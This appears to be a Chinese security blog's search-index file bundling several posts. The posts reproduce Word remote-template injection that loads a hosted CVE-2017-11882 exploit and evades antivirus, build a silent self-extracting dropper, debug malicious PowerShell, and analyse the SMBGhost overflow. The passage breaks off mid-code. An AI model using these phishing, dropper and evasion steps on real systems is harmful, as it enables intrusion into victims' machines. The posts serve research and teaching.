<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Word模版注入攻击手法复现</title>
      <link href="2020/11/28/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/28/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>Word模版注入攻击手法复现</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>本周千里目捕获到了<code>摩罗桫</code>组织以美国大大选这一热点事件来进行钓鱼攻击的恶意文件。该样本文件采用了Word模版注入的方式来绕过杀软的检测。本文便结合该样本来介绍一下Word模版注入攻击手法的原理及复现方法。</p></blockquote><p>该样本第一次在VT的扫描结果如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/image-20201127215908164.png" alt="image-20201127215908164"></p><h1 id="Word模版注入原理"><a href="#Word模版注入原理" class="headerlink" title="Word模版注入原理"></a>Word模版注入原理</h1><blockquote><p>模版注入的原理是利用Word文档加载附加模版时的缺陷，会通过向远程服务器发送恶意请求的方式，来加载远程服务器上带有<code>宏</code>或<code>漏洞利用</code>的模版，最终由这些带有宏或漏洞的模版达到攻击的目的。</p></blockquote><p><strong>优势：</strong></p><p>相交于传统的带有宏的恶意文档，这种攻击的好处是多方面的。首先Word模版注入的文档本身是不带任何恶意代码的，因此<code>能过很多静态的检测</code>；其次也不像带宏的恶意文档在启动时需要启用宏；并且可以轻松以docx的文件格式附加到电子邮件中来实施钓鱼攻击，用户稍不注意便会中招。</p><h1 id="利用手法复现"><a href="#利用手法复现" class="headerlink" title="利用手法复现"></a>利用手法复现</h1><p>与其说那么多，不如直接实战复现一下Word模版注入。</p><p>首先打开Word程序，然后会显示<code>很抱歉，获取特色模板时遇到问题，无法立即显示它们</code>，这里选择脱机工作，然后会加载出如下图中的一些模版，从中选择顺便选择一个模版创建，然后以<code>.docx</code>文件格式保存即可。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/image-20201129232322233.png" alt="image-20201129232322233"></p><p>众所周知.docx是复合文本格式（相当于压缩文件格式），因此直接通过压缩软件打开刚保存的.docx文件，并找到目录<code>word\_rels\</code>目录下的<code>settings.xml.rels</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/image-20201129233328010.png" alt="image-20201129233328010"></p><p>然后编辑<code>settings.xml.rels</code>，可以看到其中Target指向的是office模版目录下的.dotx模版文件。因此这里只需要将Target的指修改为<strong>保存恶意模版二进制的URL</strong>及可加载放在远程服务器上的恶意模版。文件内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationships</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">Relationship</span> <span class="attr">Id</span>=<span class="string">&quot;rId1&quot;</span> <span class="attr">Type</span>=<span class="string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot;</span> <span class="attr">Target</span>=<span class="string">&quot;file:///C:\Program%20Files%20(x86)\Microsoft%20Office\Root\Templates\2052\TimelessLetter.dotx&quot;</span> <span class="attr">TargetMode</span>=<span class="string">&quot;External&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">Relationships</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里作者将以Github上<a href="https://github.com/embedi/CVE-2017-11882/blob/master/example/exploit.rtf">CVE-2017-11882POC中的弹出计算器的实例文件</a>作为模版来进行加载演示。当然也可以提前生成好带宏的模版文件（.dotm）并将二进制文件放到服务器上（可Github或Pastebin），然后进行加载，这里由于原理一样就不在演示带宏的模版文件了。</p><p>将Target修改为：（两个链接都可以）</p><p><strong>Github：</strong><a href="https://raw.githubusercontent.com/embedi/CVE-2017-11882/master/example/exploit.rtf%E3%80%82%EF%BC%88%E5%8F%AF%E8%83%BD%E9%9C%80%E8%A6%81%E7%BF%BB%E5%A2%99%EF%BC%89">https://raw.githubusercontent.com/embedi/CVE-2017-11882/master/example/exploit.rtf。（可能需要翻墙）</a></p><p><strong>Pastebin：</strong><a href="https://pastebin.com/raw/ncLgYzNT%EF%BC%88%E4%B8%8D%E9%9C%80%E8%A6%81%E7%BF%BB%E5%A2%99%EF%BC%8C%E4%B8%80%E5%B9%B4%E5%90%8E%E5%A4%B1%E6%95%88%EF%BC%89%E3%80%82">https://pastebin.com/raw/ncLgYzNT（不需要翻墙，一年后失效）。</a></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/image-20201129234650976.png" alt="image-20201129234650976"></p><blockquote><p>注：如果将Target修改为Github上的二进制代码，可能存在复现不成功的情况，原因是因为访问Github的链接不是很稳定，翻墙可解决。如果Github不行，与之同样原理我们也可以将二进制文件复制放到<a href="https://pastebin.com/">Pastebin</a>上，这里作者已将CVE-2017-11882POC中弹计算器的示例文档的二进制放在<a href="https://pastebin.com/raw/ncLgYzNT">CEV-2017-11882 From Pastebin</a>上，供大家测试。</p></blockquote><p>然后将修改后的<code>settings.xml.rels</code>，重新保存到刚刚新建的文档中就可。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/image-20201130000807854.png" alt="image-20201130000807854"></p><p>然后当再次运行.docx文件时，便会加载CVE-2017-11882的弹计算器示例文档，利用成功如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5.gif" alt="Word模版注入"></p><p>经测试，火绒针对Word模版注入的文档无法检出，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/Word%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/image-20201130003355449.png" alt="image-20201130003355449"></p><h1 id="相关文档"><a href="#相关文档" class="headerlink" title="相关文档"></a>相关文档</h1><p>千里目实验室捕获<code>摩罗桫</code>文章：<a href="https://mp.weixin.qq.com/s/cXw_H-4GU8_Gnm7K4_V_2w">【高级持续性威胁追踪】利用美国大选热点事件的魔罗桫（Confucius）组织最新活动分析 (qq.com)</a></p><p>通过Cobal Strike生成带宏模版利用手法：<a href="https://www.cnblogs.com/nanjiangyue/p/14009407.html">cobal strike 钓鱼—-word宏木马（免杀） - 楠江月 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 奇技淫巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT </tag>
            
            <tag> 魔罗桫(Confucius) </tag>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VScode调试恶意PowerShell样本</title>
      <link href="2020/11/15/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode+PowerShell%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/"/>
      <url>2020/11/15/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode+PowerShell%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<center><font size=8><b>VScode调试恶意PowerShell样本</b></font></center><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>这些年无文件（Fileless）和不落地（Living off the Land）攻击已经非常流行，几乎成为攻击者的标配。PowerShell就是无文件攻击中比较常用的手法，并且其往往进行了多次混淆，使得分析起来十分不便。因此当能够调试PowerShell脚本时，分析的效率便会事半功倍。本文就主要介绍如何通过配置VScode来调试PowerShell脚本。</p></blockquote><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>要想通过Vscode调试PowerShell脚本，首先PowerShell的版本需要大于&gt;2.0(Win7默认)。因此当是Win7的操作系统，需要先升级PowerShell版本。如果是Win10则不必（默认5.1）。</p><h2 id="win7-升级PowerShell"><a href="#win7-升级PowerShell" class="headerlink" title="win7 升级PowerShell"></a>win7 升级PowerShell</h2><p>首先执行命令<code>$PSVersionTable.PSVersion</code>或<code>Get-Host | Select-Object Version</code>，确认一下当前PowerShell的版本，如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode+PowerShell%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/image-20201121191015098.png" alt="image-20201121191015098"></p><p>如果查询出来的版本号跟上图一样为2.0版本，则需要升级PowerShell版本。</p><p><strong>下载PowerShell5.1升级包</strong></p><p>微软官网下载：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=54616">https://www.microsoft.com/en-us/download/details.aspx?id=54616</a></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode+PowerShell%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/image-20201121191956842.png" alt="image-20201121191956842"></p><p><strong>安装PowerShell5.1升级包</strong></p><blockquote><p>检测运行环境：安装PowerShell5.1，需要.Net Framework4.5.2以上，如果系统当前.NET Framework版本低于4.5，则需要先升级。下载链接：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p></blockquote><p>Win7默认的PowerShell2.0是不允许运行脚本的，因此需要现先以管理员运行PowerShell，再输入如下命令允许执行脚本。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>然后在通过PowerShell运行压缩包中的脚本文件<code>Install-WMF5.1.ps1</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode+PowerShell%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/image-20201121214754515.png" alt="image-20201121214754515"></p><p>然后就会自动安装了，安装完重启完事~</p><h2 id="安装PowerShell插件"><a href="#安装PowerShell插件" class="headerlink" title="安装PowerShell插件"></a>安装PowerShell插件</h2><p>在插件中搜索<code>PowerShell</code>，然后点击安装就可，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode+PowerShell%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/image-20201121220221374.png" alt="image-20201121220221374"></p><p>注：安装完会提示一个是否更新，这里选择不更新（更新会报错，原因不详）。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode+PowerShell%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/image-20201121234139568.png" alt="image-20201121234139568"></p><p>安装完成后右下角会出现绿色的PowerShell图标，代表安装好了，然后就可以下断点进行调试了，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode+PowerShell%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/image-20201121234803189.png" alt="image-20201121234803189"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VScode </tag>
            
            <tag> PowerShell </tag>
            
            <tag> Mykings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构造自解压包</title>
      <link href="2020/11/14/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E6%9E%84%E9%80%A0%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8C%85/"/>
      <url>2020/11/14/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E6%9E%84%E9%80%A0%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<center><font size=8><b>构造自解压包</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>近期在分析Mykings样本时，其中有利用Zip自解压程序释放多个文件并运行其中解压出来的文件。因此本文就介绍一下如何通过WinRar来制作自解压文件并执行压缩文件。</p></blockquote><h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><p>用到的压缩工具：这里使用的压缩工具是最常见的WinRar，其他压缩工具应该也可以。</p><p>这里笔者先准备了个bat脚本（弹出计算器），然后右键选择<code>添加到压缩文件</code>，然后选择<code>常规</code>中压缩选项中的<code>创建自解压格式压缩文件</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E6%9E%84%E9%80%A0%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8C%85/image-20201122233938642.png" alt="image-20201122233938642"></p><p>然后选择<code>高级</code>选项中的<code>自解压选项</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E6%9E%84%E9%80%A0%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8C%85/image-20201122234054436.png" alt="image-20201122234054436"></p><p>然后需要设置解压路径，这里需要填写一下自解压路径（如果不填写则默认当前路径），这里笔者选择的根目录，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E6%9E%84%E9%80%A0%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8C%85/image-20201122235909747.png" alt="image-20201122235909747"></p><p>然后再选择设置，然后输入要执行的文件或命令，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E6%9E%84%E9%80%A0%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8C%85/image-20201123000709289.png" alt="image-20201123000709289"></p><p>最后再设置模式，将静默设置为全部隐藏，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E6%9E%84%E9%80%A0%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8C%85/image-20201123000302819.png" alt="image-20201123000302819"></p><p>至此，自解压缩可执行文件就制作好了，来测试一下效果。成功在C盘根目录释放test.bat文件，并成功执行该bat脚本，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/05_%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E6%9E%84%E9%80%A0%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8C%85/image-20201123000738275.png" alt="image-20201123000738275"></p>]]></content>
      
      
      <categories>
          
          <category> 奇技淫巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mykings </tag>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMBGhost CVE-2020-0796RCE分析</title>
      <link href="2020/06/20/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMB%20v3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2020/06/20/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMB%20v3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>SMB v3_RCE_POC分析报告</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>2020年3月12日，微软官方纰漏了SMB V3（CVE-2020-0796）漏洞，并表示该漏洞存在远程代码执行的可能。在4月份就有人证明并演示了如何利用该漏洞进行远程代码执行。而在2020年6月2日，国外安全研究员便将远程代码执行的POC公开了，使得漏洞利用风险骤然升级。本文章便结合公开的POC来简单的介绍一下如何利用CVE-202-0796来进行远程代码执行的（由于本人能力有限，后续复杂的寻找指令指针寄存器的相关内容仍需进一步分析和研究）</p></blockquote><h1 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h1><p>SMB v3支持数据压缩，当收到经过压缩的数据包时，srv2.sys中的Srv2DecompressData函数便会对数据进行解压缩，但在解压的时候，对数据的大小计算出现了整型溢出，从而导致开辟的空间小于要实际要拷贝的数据，最终导致拷贝时产生溢出。</p><h2 id="数据包协议分析"><a href="#数据包协议分析" class="headerlink" title="数据包协议分析"></a>数据包协议分析</h2><p>SMB v3 Compression数据包传送时需要使用SMB2COMPRESSION_TRANSFORM_HEADER头，微软文档对该头结构描述如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/SMBV3%E6%95%B0%E6%8D%AE%E5%8C%85%E6%A0%BC%E5%BC%8F.png" alt="SMBV3数据包格式"></p><p>SMB2COMPRESSION_TRANSFORM_HEADER头中需要我们留意两个值，一个是描述压缩数据大小的OriginalCompressedSegmentSize，另一个是描述压缩数据相对包头的偏移Offset。正是这两个值相加导致的整型溢出。SMB v3 Compression数据包结构大致如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/Compressedpackage.png" alt="Compressedpackage"></p><h2 id="溢出点分析"><a href="#溢出点分析" class="headerlink" title="溢出点分析"></a>溢出点分析</h2><p>srv2!Srv2DecompressData函数接受到客户端发送的压缩数据包，分配所需内存空间，然后解压数据并放置分配的内存空间中。如果Compression数据包Offset字段不为空时，则将Offset Data原样放置在解压缩数据之前，也就是缓冲区的开头。以下是Srv2DecompressData函数的简化代码：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/FunSrv2DecompressData.png" alt="FunSrv2DecompressData"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">Srv2DecompressData</span><span class="params">(PCOMPRESSION_TRANSFORM_HEADER PackageHeader, SIZE_T TotalSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    request = PackageHeader-&gt;psbhRequest;</span><br><span class="line">    <span class="keyword">if</span> ( request-&gt;dwMsgSize &lt; <span class="number">0x10</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xC000090B</span>i64;</span><br><span class="line">    compressHeader = *(CompressionTransformHeader *)request-&gt;pNetRawBuffer;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// (A) 整型溢出</span></span><br><span class="line">    <span class="comment">//当OriginalCompressedSegmentSize+offset小于等于0x1100时，将会申请长度为0x1100的UncompressedBuffer缓冲区</span></span><br><span class="line">    PSRVNET_BUFFER_HDR AllocHeader = SrvNetAllocateBuffer(                            <span class="comment">//如果offset=0xffffffff时，开辟的空间变小</span></span><br><span class="line">        (ULONG)(compressHeader-&gt;OriginalCompressedSegmentSize + compressHeader-&gt;Offset),</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line">    If (!AllocHeader) </span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line"> </span><br><span class="line">    ULONG FinalCompressedSize = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// (B) 第一次缓冲区溢出，解压缩数据,溢出覆盖newHeader-&gt;pNetRawBuffer后的数据（为了弄清楚溢出覆盖的内容看函数SrvNetAllocateBufferFromPool)</span></span><br><span class="line">    <span class="comment">//该解函数在解压缩成功后将更新finalDecompressedSize = CompressedBufferSize，从而导致不走SrvNetFreeBuffer分支</span></span><br><span class="line">    NTSTATUS Status = SmbCompressionDecompress(</span><br><span class="line">        compressHeader-&gt;CompressionAlgorithm,</span><br><span class="line">        (PUCHAR)compressHeader + <span class="keyword">sizeof</span>(COMPRESSION_TRANSFORM_HEADER) + compressHeader-&gt;Offset, <span class="comment">//CompressedBuffer</span></span><br><span class="line">        (ULONG)(TotalSize - <span class="keyword">sizeof</span>(COMPRESSION_TRANSFORM_HEADER) - compressHeader-&gt;Offset),    <span class="comment">//CompressedBufferSize 溢出点</span></span><br><span class="line">        (PUCHAR)AllocHeader-&gt;UserBuffer + compressHeader-&gt;Offset,       <span class="comment">//UncompressedBuffer，会传入SmbCompressionDecompress函数进行Decompress处理。</span></span><br><span class="line">        compressHeader-&gt;OriginalCompressedSegmentSize,</span><br><span class="line">        &amp;FinalCompressedSize);</span><br><span class="line">    <span class="comment">//如果走这个分支，可以通过覆盖NewHeader来实现free-after-free,UAF</span></span><br><span class="line">    <span class="keyword">if</span> (Status &lt; <span class="number">0</span> || FinalCompressedSize != compressHeader-&gt;OriginalCompressedSegmentSize) </span><br><span class="line">    &#123;</span><br><span class="line">        SrvNetFreeBuffer(AllocHeader);</span><br><span class="line">        <span class="keyword">return</span> STATUS_BAD_DATA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (compressHeader-&gt;Offset &gt; <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">         <span class="comment">// (C) 第二次缓冲区溢出</span></span><br><span class="line">        <span class="built_in">memcpy</span>(</span><br><span class="line">            AllocHeader-&gt;UserBuffer,</span><br><span class="line">            (PUCHAR)compressHeader + <span class="keyword">sizeof</span>(COMPRESSION_TRANSFORM_HEADER), <span class="comment">//指向offset data</span></span><br><span class="line">            compressHeader-&gt;Offset);</span><br><span class="line">    &#125;</span><br><span class="line">    Srv2ReplaceReceiveBuffer(some_session_handle, AllocHeader);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据包被函数Srv2DecompressData处理的示意图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/Srv2DecompressData.png" alt="Srv2DecompressData"></p><h3 id="开辟内存空间"><a href="#开辟内存空间" class="headerlink" title="开辟内存空间"></a>开辟内存空间</h3><p>在代码A处SrvNetAllocateBuffer函数申请内存空间，第一个参数为originalCompressedSegSize加上offset的值表示要开辟空间的大小。由于该函数是直接使用eax和ecx来将两数相加，然后取结果的4字节作为参数开辟空间，没有考虑到进位的情况，产生整型溢出从而导致开辟的空间比实际的小。例如originalCompressedSegSize大小为0xffffffff，Offset大小为0x10，两个数相加结果应该为0x10000000f，而由于没有考虑进位，实际作为参数传进去的大小便为0xf，导致开辟的内存空间远远小于实际大小。反汇编代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/SrvNetAllocateBufferidb.png" alt="SrvNetAllocateBufferidb"></p><h4 id="深入分析SrvNetAllocateBuffer"><a href="#深入分析SrvNetAllocateBuffer" class="headerlink" title="深入分析SrvNetAllocateBuffer"></a>深入分析SrvNetAllocateBuffer</h4><p>Srvnet!SrvNetAllocateBuffer会根据所需分配空间大小进行判断。当所需大小大于16MB时将不进行分配，所需大小大于1MB小于16MB时，调用函数SrvNetAllocateBufferFromPool进行分配空间。其余小于1MB的数据使用后备列表（Lookaside List）来进行分配。以下是SrvNetAllocateBuffer函数的简化代码：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02_SMBv3_RCE_POC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/FunSrvNetAllocateBuffer.png" alt="FunSrvNetAllocateBuffer"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PALLOCATION_HEADER <span class="title">SrvNetAllocateBuffer</span><span class="params">(SIZE_T AllocSize, PALLOCATION_HEADER SourceBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (SrvDisableNetBufferLookAsideList || AllocSize &gt; <span class="number">0x100100</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (AllocSize &gt; <span class="number">0x1000100</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Result = SrvNetAllocateBufferFromPool(AllocSize, AllocSize);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> LookasideListIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (AllocSize &gt; <span class="number">0x1100</span>) &#123;</span><br><span class="line">            LookasideListIndex = <span class="comment">/* some calculation based on AllocSize */</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        SOME_STRUCT <span class="built_in">list</span> = 